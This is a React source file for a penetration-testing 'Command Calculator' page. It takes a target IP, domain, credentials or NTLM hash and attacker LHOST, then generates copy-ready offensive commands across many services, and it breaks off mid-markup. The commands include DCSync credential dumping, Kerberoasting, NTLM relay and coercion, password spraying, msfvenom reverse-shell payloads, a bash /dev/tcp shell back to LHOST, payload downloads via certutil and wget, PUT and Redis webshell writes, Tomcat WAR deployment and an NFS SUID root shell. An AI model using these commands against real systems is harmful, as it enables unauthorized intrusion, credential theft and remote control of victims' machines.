import React, { useState, useMemo } from "react";

/**
 * Command Calculator — standalone page for The Path.
 * Pick a service, get its full command set (all phases) with your variables
 * substituted in. The auth toggle (password / NTLM hash / Kerberos) rewrites
 * AD commands at once. Global filter searches across every service.
 * Self-contained: no external deps. Drop in as a route like the pivot calculator.
 */

export default function CommandCalculator() {
  const [ip, setIp] = useState("");
  const [dcip, setDcip] = useState("");
  const [host, setHost] = useState("");
  const [domain, setDomain] = useState("");
  const [user, setUser] = useState("");
  const [secret, setSecret] = useState("");
  const [authMode, setAuthMode] = useState("pw"); // pw | hash | krb
  const [lhost, setLhost] = useState("");
  const [lport, setLport] = useState("443");
  const [wordlist, setWordlist] = useState("/usr/share/wordlists/rockyou.txt");
  const [service, setService] = useState("ad");
  const [filter, setFilter] = useState("");
  const [copied, setCopied] = useState(null);
  const [collapsed, setCollapsed] = useState({});

  const IP = ip || "<IP>";
  const DCIP = dcip || ip || "<DCIP>";
  const HOST = host || "<HOST>";
  const D = domain || "<DOMAIN>";
  const U = user || "<USER>";
  const LH = lhost || "<LHOST>";
  const LP = lport || "443";
  const WL = wordlist || "<WORDLIST>";
  const SEC = secret || (authMode === "hash" ? "<HASH>" : "<PASS>");
  const baseDN = domain ? domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>";
  const NB = domain ? (domain.split(".")[0] || "").toUpperCase() : "<NB>";

  const impTgt = (forceHost = false) => {
    const t = authMode === "krb" || forceHost ? HOST : IP;
    if (authMode === "pw") return `'${D}/${U}:${SEC}@${t}'`;
    if (authMode === "hash") return `'${D}/${U}@${t}' -hashes :${SEC}`;
    return `'${D}/${U}@${t}' -k -no-pass -dc-ip ${DCIP}`;
  };
  const nxcA = () => {
    if (authMode === "pw") return `-u '${U}' -p '${SEC}'`;
    if (authMode === "hash") return `-u '${U}' -H '${SEC}'`;
    return `-u '${U}' -k`;
  };
  const ldapAuth = `-D "${U}@${D}" -w '${SEC}'`;

  const services = useMemo(() => {
    const L = `ldap://${IP}`;
    return {
      ad: {
        name: "AD Attacks", port: "core",
        groups: [
          { phase: "Auth & Exec", cmds: [
            { label: "psexec", cmd: `impacket-psexec ${impTgt()}` },
            { label: "wmiexec", cmd: `impacket-wmiexec ${impTgt()}` },
            { label: "smbexec", cmd: `impacket-smbexec ${impTgt()}` },
            { label: "atexec (single cmd)", cmd: `impacket-atexec ${impTgt()} 'whoami'` },
          ]},
          { phase: "Credentials", cmds: [
            { label: "secretsdump — DCSync (NTLM)", cmd: `impacket-secretsdump ${impTgt()} -just-dc-ntlm -outputfile dcsync` },
            { label: "secretsdump — one user", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user Administrator` },
            { label: "secretsdump — krbtgt", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user krbtgt` },
            { label: "secretsdump — local (SAM/LSA)", cmd: `impacket-secretsdump ${impTgt()}` },
            { label: "Password spray", cmd: `nxc smb ${IP} -u users.txt -p '${SEC}' --continue-on-success` },
          ]},
          { phase: "Roasting", cmds: [
            { label: "nxc — kerberoast", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting kerb.txt` },
            { label: "GetUserSPNs — kerberoast", cmd: authMode === "krb" ? `impacket-GetUserSPNs -k -no-pass -dc-host ${HOST}.${D} ${D}/ -request -outputfile kerb.txt` : `impacket-GetUserSPNs '${D}/${U}:${SEC}' -dc-ip ${DCIP} -request -outputfile kerb.txt` },
            { label: "nxc — AS-REP roast", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
            { label: "GetNPUsers — AS-REP (no creds)", cmd: `impacket-GetNPUsers ${D}/ -usersfile users.txt -dc-ip ${DCIP} -request -format hashcat -outputfile asrep.txt` },
          ]},
          { phase: "Relay & Poison", cmds: [
            { label: "responder", cmd: `sudo responder -I tun0 -dwv` },
            { label: "ntlmrelayx — interactive", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support -i` },
            { label: "Coerce (PetitPotam)", cmd: `python3 PetitPotam.py -u '${U}' -p '${SEC}' -d ${D} ${LH} ${IP}` },
          ]},
        ],
      },
      ldap: {
        name: "LDAP", port: "389 / 636 / 3268",
        groups: [
          { phase: "Connect", cmds: [
            { label: "Anonymous bind", cmd: `ldapsearch -x -H ${L} -b "${baseDN}"` },
            { label: "Authenticated (UPN)", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}"` },
            { label: "LDAPS (636)", cmd: `ldapsearch -x -H ldaps://${IP}:636 ${ldapAuth} -b "${baseDN}"` },
            { label: "ldapwhoami — test auth", cmd: `ldapwhoami -x -H ${L} ${ldapAuth}` },
          ]},
          { phase: "Recon", cmds: [
            { label: "nmap — ports", cmd: `nmap -p 389,636,3268 ${IP}` },
            { label: "nmap — rootDSE script", cmd: `nmap -p 389 -sV --script ldap-rootdse ${IP}` },
            { label: "Root DSE", cmd: `ldapsearch -x -H ${L} -b "" -s base "(objectclass=*)"` },
            { label: "Naming contexts (base DNs)", cmd: `ldapsearch -x -H ${L} -b "" -s base namingContexts` },
            { label: "All rootDSE attributes", cmd: `ldapsearch -x -H ${L} -b "" -s base "(objectclass=*)" "*" "+"` },
          ]},
          { phase: "Enumeration", cmds: [
            { label: "Domain info", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=domain)"` },
            { label: "All users", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=person)"` },
            { label: "Users — sAMAccountName", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName` },
            { label: "Groups", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=group)" cn` },
            { label: "Domain Admins members", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(cn=Domain Admins)" member` },
            { label: "Computers", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" cn operatingSystem` },
            { label: "Domain controllers", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName` },
          ]},
          { phase: "Attribute hunting", cmds: [
            { label: "Description fields (creds!)", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(description=*)" description | grep -i "pass\\|pwd\\|secret"` },
            { label: "info field", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(info=*)" info` },
            { label: "Emails", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(mail=*)" mail` },
          ]},
          { phase: "Attack vectors", cmds: [
            { label: "Null bind", cmd: `ldapsearch -x -H ${L} -D "" -w "" -b "${baseDN}"` },
            { label: "Password-never-expires users", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName` },
            { label: "Kerberoastable (SPN set)", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` },
            { label: "AS-REP roastable (no preauth)", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName` },
            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt ${IP} ldap2 -s 389` },
          ]},
          { phase: "Post-ex / dump", cmds: [
            { label: "Full user dump → ldif", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" "*" "+" > all_users.ldif` },
            { label: "ldapdomaindump", cmd: `ldapdomaindump -u '${D}\\${U}' -p '${SEC}' ${IP}` },
            { label: "windapsearch — users", cmd: `windapsearch -d ${D} -u ${U} -p '${SEC}' --dc-ip ${DCIP} -U` },
            { label: "Add user to Domain Admins (.ldif)", cmd: `ldapmodify -x -H ${L} ${ldapAuth} -f add_admin.ldif` },
          ]},
        ],
      },
      smb: {
        name: "SMB", port: "139 / 445",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nxc — fingerprint", cmd: `nxc smb ${IP}` },
            { label: "nmap — vuln scripts", cmd: `nmap -p445 --script "smb-vuln-*" ${IP}` },
            { label: "enum4linux-ng", cmd: `enum4linux-ng -A ${IP}` },
          ]},
          { phase: "Enumeration", cmds: [
            { label: "nxc — shares", cmd: `nxc smb ${IP} ${nxcA()} --shares` },
            { label: "nxc — users", cmd: `nxc smb ${IP} ${nxcA()} --users` },
            { label: "nxc — RID brute", cmd: `nxc smb ${IP} ${nxcA()} --rid-brute` },
            { label: "nxc — password policy", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol` },
            { label: "smbclient — list shares", cmd: `smbclient -L //${IP}/ -U '${D}\\${U}%${SEC}'` },
            { label: "smbmap", cmd: `smbmap -H ${IP} -d ${D} -u '${U}' -p '${SEC}'` },
            { label: "lookupsid (RID)", cmd: `impacket-lookupsid '${D}/${U}:${SEC}@${IP}'` },
          ]},
          { phase: "Access", cmds: [
            { label: "smbclient — connect share", cmd: `smbclient //${IP}/SHARE -U '${D}\\${U}%${SEC}'` },
            { label: "Mount share", cmd: `sudo mount -t cifs //${IP}/SHARE /mnt/share -o username=${U},password=${SEC},domain=${D}` },
            { label: "nxc — spider shares", cmd: `nxc smb ${IP} ${nxcA()} -M spider_plus` },
            { label: "Null session", cmd: `nxc smb ${IP} -u '' -p ''` },
          ]},
        ],
      },
      kerberos: {
        name: "Kerberos", port: "88",
        groups: [
          { phase: "Enumeration", cmds: [
            { label: "kerbrute — userenum", cmd: `kerbrute userenum -d ${D} --dc ${DCIP} users.txt` },
            { label: "nmap — enum users", cmd: `nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='${D}' ${IP}` },
          ]},
          { phase: "Roasting", cmds: [
            { label: "GetUserSPNs — kerberoast", cmd: `impacket-GetUserSPNs '${D}/${U}:${SEC}' -dc-ip ${DCIP} -request -outputfile kerb.txt` },
            { label: "GetNPUsers — AS-REP roast", cmd: `impacket-GetNPUsers ${D}/ -usersfile users.txt -dc-ip ${DCIP} -request -format hashcat -outputfile asrep.txt` },
          ]},
          { phase: "Tickets", cmds: [
            { label: "getTGT (request ticket)", cmd: `impacket-getTGT '${D}/${U}:${SEC}' -dc-ip ${DCIP}` },
            { label: "Use ticket", cmd: `export KRB5CCNAME=${U}.ccache` },
            { label: "kerbrute — password spray", cmd: `kerbrute passwordspray -d ${D} --dc ${DCIP} users.txt '${SEC}'` },
          ]},
        ],
      },
      mssql: {
        name: "MSSQL", port: "1433",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — info", cmd: `nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info ${IP}` },
            { label: "nxc — check", cmd: `nxc mssql ${IP} ${nxcA()}` },
          ]},
          { phase: "Connect", cmds: [
            { label: "mssqlclient (Windows auth)", cmd: `impacket-mssqlclient '${D}/${U}:${SEC}@${IP}' -windows-auth` },
            { label: "mssqlclient (SQL auth)", cmd: `impacket-mssqlclient '${U}:${SEC}@${IP}'` },
            { label: "nxc — run query", cmd: `nxc mssql ${IP} ${nxcA()} -q 'SELECT name FROM sys.databases'` },
          ]},
          { phase: "Exec", cmds: [
            { label: "nxc — xp_cmdshell", cmd: `nxc mssql ${IP} ${nxcA()} -x 'whoami'` },
            { label: "Enable xp_cmdshell", cmd: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` },
            { label: "Capture hash (xp_dirtree)", cmd: `EXEC master..xp_dirtree '\\\\${LH}\\share'` },
          ]},
        ],
      },
      mysql: {
        name: "MySQL", port: "3306",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — enum", cmd: `nmap -p3306 --script mysql-info,mysql-empty-password,mysql-enum ${IP}` },
          ]},
          { phase: "Connect", cmds: [
            { label: "mysql client", cmd: `mysql -h ${IP} -u ${U} -p'${SEC}'` },
            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt ${IP} mysql` },
          ]},
          { phase: "Post-ex", cmds: [
            { label: "Dump users/hashes", cmd: `SELECT user,authentication_string FROM mysql.user;` },
            { label: "Read file (FILE priv)", cmd: `SELECT LOAD_FILE('/etc/passwd');` },
          ]},
        ],
      },
      winrm: {
        name: "WinRM", port: "5985 / 5986",
        groups: [
          { phase: "Check", cmds: [
            { label: "nxc — check", cmd: `nxc winrm ${IP} ${nxcA()}` },
            { label: "nmap — detect", cmd: `nmap -p5985,5986 -sV ${IP}` },
          ]},
          { phase: "Shell", cmds: [
            { label: "evil-winrm", cmd: authMode === "hash" ? `evil-winrm -i ${IP} -u '${U}' -H ${SEC}` : `evil-winrm -i ${IP} -u '${U}' -p '${SEC}'` },
            { label: "nxc — exec", cmd: `nxc winrm ${IP} ${nxcA()} -x 'whoami'` },
          ]},
        ],
      },
      ssh: {
        name: "SSH", port: "22",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — auth methods", cmd: `nmap -p22 --script ssh-auth-methods,ssh2-enum-algos ${IP}` },
          ]},
          { phase: "Access", cmds: [
            { label: "ssh — password", cmd: `ssh ${U}@${IP}` },
            { label: "ssh — key", cmd: `chmod 600 id_rsa && ssh -i id_rsa ${U}@${IP}` },
            { label: "nxc — check", cmd: `nxc ssh ${IP} -u '${U}' -p '${SEC}'` },
            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt ssh://${IP}` },
          ]},
        ],
      },
      rdp: {
        name: "RDP", port: "3389",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — encryption", cmd: `nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info ${IP}` },
            { label: "nxc — check", cmd: `nxc rdp ${IP} ${nxcA()}` },
          ]},
          { phase: "Access", cmds: [
            { label: "xfreerdp", cmd: authMode === "hash" ? `xfreerdp /v:${IP} /u:${U} /pth:${SEC} /cert:ignore +clipboard /dynamic-resolution` : `xfreerdp /v:${IP} /u:${U} /p:'${SEC}' /cert:ignore +clipboard /dynamic-resolution` },
            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt rdp://${IP}` },
          ]},
        ],
      },
      ftp: {
        name: "FTP", port: "21",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — anon + scripts", cmd: `nmap -p21 --script ftp-anon,ftp-syst ${IP}` },
          ]},
          { phase: "Access", cmds: [
            { label: "Anonymous login", cmd: `ftp ${IP}   # user: anonymous / pass: anything` },
            { label: "Login", cmd: `ftp ${U}@${IP}` },
            { label: "Mirror everything (wget)", cmd: `wget -r ftp://${U}:'${SEC}'@${IP}/` },
            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt ftp://${IP}` },
          ]},
        ],
      },
      snmp: {
        name: "SNMP", port: "161 (udp)",
        groups: [
          { phase: "Recon", cmds: [
            { label: "snmpwalk (v2c, public)", cmd: `snmpwalk -v2c -c public ${IP}` },
            { label: "snmp-check", cmd: `snmp-check ${IP}` },
            { label: "onesixtyone — community brute", cmd: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ${IP}` },
          ]},
          { phase: "Mining", cmds: [
            { label: "Processes", cmd: `snmpwalk -v2c -c public ${IP} 1.3.6.1.2.1.25.4.2.1.2` },
            { label: "Installed software", cmd: `snmpwalk -v2c -c public ${IP} 1.3.6.1.2.1.25.6.3.1.2` },
            { label: "Listening ports", cmd: `snmpwalk -v2c -c public ${IP} 1.3.6.1.2.1.6.13.1.3` },
          ]},
        ],
      },
      smtp: {
        name: "SMTP", port: "25 / 587",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — commands/users", cmd: `nmap -p25 --script smtp-commands,smtp-enum-users ${IP}` },
            { label: "Banner / connect", cmd: `nc -nv ${IP} 25` },
          ]},
          { phase: "User enum", cmds: [
            { label: "smtp-user-enum (VRFY)", cmd: `smtp-user-enum -M VRFY -U users.txt -t ${IP}` },
            { label: "VRFY (manual)", cmd: `VRFY ${U}` },
          ]},
        ],
      },
      dns: {
        name: "DNS", port: "53",
        groups: [
          { phase: "Recon", cmds: [
            { label: "Zone transfer (AXFR)", cmd: `dig axfr @${IP} ${D}` },
            { label: "dnsenum", cmd: `dnsenum --dnsserver ${IP} ${D}` },
            { label: "dnsrecon", cmd: `dnsrecon -d ${D} -n ${IP} -a` },
            { label: "Reverse lookup", cmd: `dig -x ${IP} @${IP}` },
          ]},
        ],
      },
      payloads: {
        name: "Payloads & Shells", port: "—",
        groups: [
          { phase: "msfvenom", cmds: [
            { label: "aspx (IIS)", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f aspx -o shell.aspx` },
            { label: "exe", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f exe -o shell.exe` },
            { label: "elf (Linux)", cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f elf -o shell.elf` },
            { label: "war (Tomcat)", cmd: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f war -o shell.war` },
          ]},
          { phase: "Reverse shells", cmds: [
            { label: "bash", cmd: `bash -i >& /dev/tcp/${LH}/${LP} 0>&1` },
            { label: "nc listener", cmd: `rlwrap -cAr nc -lvnp ${LP}` },
          ]},
        ],
      },
      transfer: {
        name: "File Transfer", port: "—",
        groups: [
          { phase: "Serve (Kali)", cmds: [
            { label: "HTTP server", cmd: `python3 -m http.server 80` },
            { label: "SMB server", cmd: `impacket-smbserver share . -smb2support -user a -password a` },
          ]},
          { phase: "Pull (victim)", cmds: [
            { label: "certutil (Win)", cmd: `certutil -urlcache -split -f http://${LH}/file.exe file.exe` },
            { label: "PowerShell (Win)", cmd: `powershell -c "iwr http://${LH}/file.exe -OutFile file.exe"` },
            { label: "wget (Linux)", cmd: `wget http://${LH}/file -O /tmp/file && chmod +x /tmp/file` },
          ]},
        ],
      },
      http: {
        name: "HTTP / HTTPS", port: "80 / 443 / 8080",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — web ports + version", cmd: `nmap -p80,443,8080,8443 -sV ${IP}` },
            { label: "nmap — http scripts", cmd: `nmap -p80 --script http-enum,http-methods,http-headers ${IP}` },
            { label: "whatweb — fingerprint", cmd: `whatweb http://${IP}` },
            { label: "Headers", cmd: `curl -s -I http://${IP}` },
            { label: "OPTIONS — verbs (WebDAV tell)", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i allow` },
            { label: "wafw00f — detect WAF", cmd: `wafw00f http://${IP}` },
            { label: "nikto", cmd: `nikto -h http://${IP}` },
          ]},
          { phase: "Content discovery", cmds: [
            { label: "feroxbuster", cmd: `feroxbuster -u http://${IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt` },
            { label: "gobuster", cmd: `gobuster dir -u http://${IP} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt` },
            { label: "ffuf — paths", cmd: `ffuf -u http://${IP}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` },
            { label: "ffuf — vhosts", cmd: `ffuf -u http://${IP} -H "Host: FUZZ.${D}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0` },
            { label: "robots.txt", cmd: `curl -s http://${IP}/robots.txt` },
            { label: "Source/config leaks", cmd: `curl -s http://${IP}/.git/config ; curl -s http://${IP}/web.config` },
          ]},
          { phase: "Attack", cmds: [
            { label: "hydra — basic auth", cmd: `hydra -l ${U} -P /usr/share/wordlists/rockyou.txt ${IP} http-get /admin` },
            { label: "hydra — login form", cmd: `hydra -l ${U} -P passwords.txt ${IP} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"` },
            { label: "PUT webshell (if enabled)", cmd: `curl -X PUT http://${IP}/shell.php -d '<?php system($_GET["cmd"]); ?>'` },
            { label: "Trigger webshell", cmd: `curl "http://${IP}/shell.php?cmd=whoami"` },
          ]},
        ],
      },
      webdav: {
        name: "WebDAV", port: "80 / 443",
        groups: [
          { phase: "Detect", cmds: [
            { label: "OPTIONS — verbs", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i allow` },
            { label: "nmap — webdav scan", cmd: `nmap -p80,443 --script http-webdav-scan ${IP}` },
          ]},
          { phase: "Test access", cmds: [
            { label: "davtest (auth)", cmd: `davtest -url http://${IP} -auth '${U}:${SEC}'` },
            { label: "cadaver (interactive)", cmd: `cadaver http://${IP}/` },
          ]},
          { phase: "Upload → RCE (IIS)", cmds: [
            { label: "PUT as .txt", cmd: `curl -s -u '${U}:${SEC}' -X PUT http://${IP}/shell.txt --data-binary @shell.aspx` },
            { label: "MOVE to .aspx", cmd: `curl -s -u '${U}:${SEC}' -X MOVE http://${IP}/shell.txt -H "Destination: http://${IP}/shell.aspx"` },
            { label: "Trigger", cmd: `curl -s -u '${U}:${SEC}' "http://${IP}/shell.aspx"` },
          ]},
        ],
      },
      tomcat: {
        name: "Tomcat", port: "8080 / 8009",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — version", cmd: `nmap -p8080,8443,8009 -sV ${IP}` },
            { label: "Version page", cmd: `curl -s http://${IP}:8080/docs/ | grep -i "version"` },
            { label: "Manager (browse)", cmd: `http://${IP}:8080/manager/html` },
          ]},
          { phase: "Brute manager", cmds: [
            { label: "hydra — default creds", cmd: `hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt ${IP} -s 8080 http-get /manager/html` },
            { label: "List apps (authed)", cmd: `curl -u '${U}:${SEC}' http://${IP}:8080/manager/text/list` },
          ]},
          { phase: "WAR → RCE", cmds: [
            { label: "Build WAR shell", cmd: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f war -o shell.war` },
            { label: "Deploy", cmd: `curl -u '${U}:${SEC}' --upload-file shell.war "http://${IP}:8080/manager/text/deploy?path=/shell&update=true"` },
            { label: "Trigger", cmd: `curl "http://${IP}:8080/shell/"` },
            { label: "Undeploy (cleanup)", cmd: `curl -u '${U}:${SEC}' "http://${IP}:8080/manager/text/undeploy?path=/shell"` },
          ]},
          { phase: "Ghostcat (AJP 8009)", cmds: [
            { label: "nmap — ajp methods", cmd: `nmap -p8009 --script ajp-methods,ajp-request ${IP}` },
          ]},
        ],
      },
      nfs: {
        name: "NFS", port: "111 / 2049",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — nfs scripts", cmd: `nmap -p111,2049 -sV --script nfs-ls,nfs-showmount,nfs-statfs ${IP}` },
            { label: "showmount — exports", cmd: `showmount -e ${IP}` },
            { label: "rpcinfo", cmd: `rpcinfo -p ${IP}` },
          ]},
          { phase: "Mount", cmds: [
            { label: "Mount share", cmd: `mkdir -p /mnt/nfs && sudo mount -t nfs ${IP}:/share /mnt/nfs -o nolock` },
            { label: "Mount v3 (older)", cmd: `sudo mount -t nfs -o vers=3 ${IP}:/share /mnt/nfs` },
            { label: "Find sensitive files", cmd: `find /mnt/nfs -name "*.key" -o -name "*.pem" -o -name "id_rsa" -o -name "*password*"` },
          ]},
          { phase: "Privesc", cmds: [
            { label: "no_root_squash SUID (on Kali)", cmd: `cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash` },
            { label: "...then on target", cmd: `/share/rootbash -p   # root shell` },
            { label: "UID match (read owned files)", cmd: `sudo useradd -u 1000 fakeuser && su fakeuser` },
          ]},
        ],
      },
      postgres: {
        name: "PostgreSQL", port: "5432",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — brute", cmd: `nmap -p5432 --script pgsql-brute ${IP}` },
            { label: "nxc — check", cmd: `nxc postgres ${IP} -u ${U} -p '${SEC}'` },
          ]},
          { phase: "Connect", cmds: [
            { label: "psql", cmd: `PGPASSWORD='${SEC}' psql -h ${IP} -U ${U} -d postgres` },
            { label: "List databases", cmd: `\\\\l` },
          ]},
          { phase: "Exploit", cmds: [
            { label: "RCE (COPY FROM PROGRAM)", cmd: `COPY cmd_exec FROM PROGRAM 'id';` },
            { label: "Read file", cmd: `CREATE TABLE x(t text); COPY x FROM '/etc/passwd'; SELECT * FROM x;` },
          ]},
        ],
      },
      redis: {
        name: "Redis", port: "6379",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — info", cmd: `nmap -p6379 --script redis-info ${IP}` },
            { label: "Connect", cmd: `redis-cli -h ${IP}` },
            { label: "Server info", cmd: `redis-cli -h ${IP} INFO` },
          ]},
          { phase: "Exploit", cmds: [
            { label: "Webshell write", cmd: `redis-cli -h ${IP} config set dir /var/www/html; redis-cli -h ${IP} config set dbfilename shell.php; redis-cli -h ${IP} set x "<?php system(\\$_GET['c']); ?>"; redis-cli -h ${IP} save` },
            { label: "SSH key write (dir = .ssh)", cmd: `cat id_rsa.pub | redis-cli -h ${IP} -x set sshkey` },
          ]},
        ],
      },
      pop3imap: {
        name: "POP3 / IMAP", port: "110 / 143 / 993 / 995",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmap — capabilities", cmd: `nmap -p110,143,993,995 --script pop3-capabilities,imap-capabilities ${IP}` },
            { label: "Connect POP3", cmd: `nc -nv ${IP} 110` },
            { label: "Connect IMAP", cmd: `nc -nv ${IP} 143` },
          ]},
          { phase: "Read mail (POP3)", cmds: [
            { label: "Login + list", cmd: `USER ${U}` },
            { label: "Password", cmd: `PASS ${SEC}` },
            { label: "List / read", cmd: `LIST` },
          ]},
          { phase: "Brute", cmds: [
            { label: "hydra — pop3", cmd: `hydra -l ${U} -P passwords.txt ${IP} pop3` },
          ]},
        ],
      },
      rpcbind: {
        name: "RPCbind", port: "111",
        groups: [
          { phase: "Recon", cmds: [
            { label: "rpcinfo", cmd: `rpcinfo -p ${IP}` },
            { label: "nmap — rpcinfo", cmd: `nmap -p111 --script rpcinfo ${IP}` },
          ]},
        ],
      },
      netbios: {
        name: "NetBIOS", port: "137 / 138 / 139",
        groups: [
          { phase: "Recon", cmds: [
            { label: "nmblookup", cmd: `nmblookup -A ${IP}` },
            { label: "nbtscan", cmd: `nbtscan ${IP}` },
            { label: "nmap — nbstat", cmd: `sudo nmap -sU -p137 --script nbstat ${IP}` },
          ]},
        ],
      },
      telnet: {
        name: "Telnet", port: "23",
        groups: [
          { phase: "Access", cmds: [
            { label: "Connect", cmd: `telnet ${IP}` },
            { label: "nmap — info", cmd: `nmap -p23 --script telnet-ntlm-info,telnet-encryption ${IP}` },
            { label: "hydra — brute", cmd: `hydra -l ${U} -P passwords.txt telnet://${IP}` },
          ]},
        ],
      },
      tftp: {
        name: "TFTP", port: "69 (udp)",
        groups: [
          { phase: "Access", cmds: [
            { label: "Connect", cmd: `tftp ${IP}` },
            { label: "Download a file", cmd: `tftp ${IP} -c get FILENAME` },
            { label: "Upload a file", cmd: `tftp ${IP} -c put shell.php` },
            { label: "nmap — enum", cmd: `sudo nmap -sU -p69 --script tftp-enum ${IP}` },
          ]},
        ],
      },
      setup: {
        name: "Setup / hosts", port: "—",
        groups: [
          { phase: "Variables", cmds: [
            { label: "/etc/hosts line", cmd: `${IP}  ${HOST}.${D} ${D} ${HOST}` },
            { label: "Env exports", cmd: `export ip=${IP}; export dcip=${DCIP}; export domain=${D}; export lhost=${LH}` },
            { label: "Sync clock to DC", cmd: `sudo ntpdate ${DCIP}` },
          ]},
        ],
      },
    };
  }, [IP, DCIP, HOST, D, U, SEC, LH, LP, WL, baseDN, authMode, ldapAuth]);

  const order = ["setup","ad","ldap","smb","kerberos","mssql","mysql","postgres","redis","winrm","ssh","rdp","ftp","nfs","http","webdav","tomcat","pop3imap","rpcbind","netbios","telnet","tftp","snmp","smtp","dns","payloads","transfer"];

  const doCopy = (cmd, key) => {
    navigator.clipboard?.writeText(cmd);
    setCopied(key);
    setTimeout(() => setCopied((c) => (c === key ? null : c)), 1100);
  };
  const toggle = (k) => setCollapsed((c) => ({ ...c, [k]: !c[k] }));

  const renderCmd = (cmd) =>
    cmd.split(/(<[A-Z]+>)/g).map((p, i) =>
      /^<[A-Z]+>$/.test(p) ? <span key={i} className="ph">{p}</span> : <span key={i}>{p}</span>
    );

  const fields = [
    ["Target IP", ip, setIp, "10.10.10.10"],
    ["DC IP", dcip, setDcip, "(defaults to target)"],
    ["Hostname", host, setHost, "DC01"],
    ["Domain", domain, setDomain, "corp.local"],
    ["User", user, setUser, "j.doe"],
    [authMode === "hash" ? "NTLM hash" : "Password", secret, setSecret, authMode === "hash" ? "aad3b...:nthash" : "Summer2026!"],
    ["LHOST", lhost, setLhost, "10.10.14.5"],
    ["LPORT", lport, setLport, "443"],
  ];

  const fil = filter.trim().toLowerCase();
  const view = fil
    ? order.map((id) => ({ id, svc: services[id], groups: services[id].groups
        .map((g) => ({ ...g, cmds: g.cmds.filter((c) => (c.label + c.cmd).toLowerCase().includes(fil)) }))
        .filter((g) => g.cmds.length) })).filter((s) => s.groups.length)
    : [{ id: service, svc: services[service], groups: services[service].groups }];

  return (
    <div className="cc-root">
      <style>{CSS}</style>

      <header className="cc-head">
        <div className="cc-title"><span className="cc-mark">$_</span> Command Calculator</div>
        <div className="cc-sub">Set variables once · pick a service · click any command to copy</div>
      </header>

      <div className="cc-panel">
        <div className="cc-grid">
          {fields.map(([label, val, set, ph]) => (
            <label key={label} className="cc-field">
              <span>{label}</span>
              <input value={val} placeholder={ph} onChange={(e) => set(e.target.value)} spellCheck={false} />
            </label>
          ))}
          <label className="cc-field cc-wide">
            <span>Wordlist</span>
            <input value={wordlist} onChange={(e) => setWordlist(e.target.value)} spellCheck={false} />
          </label>
        </div>

        <div className="cc-row">
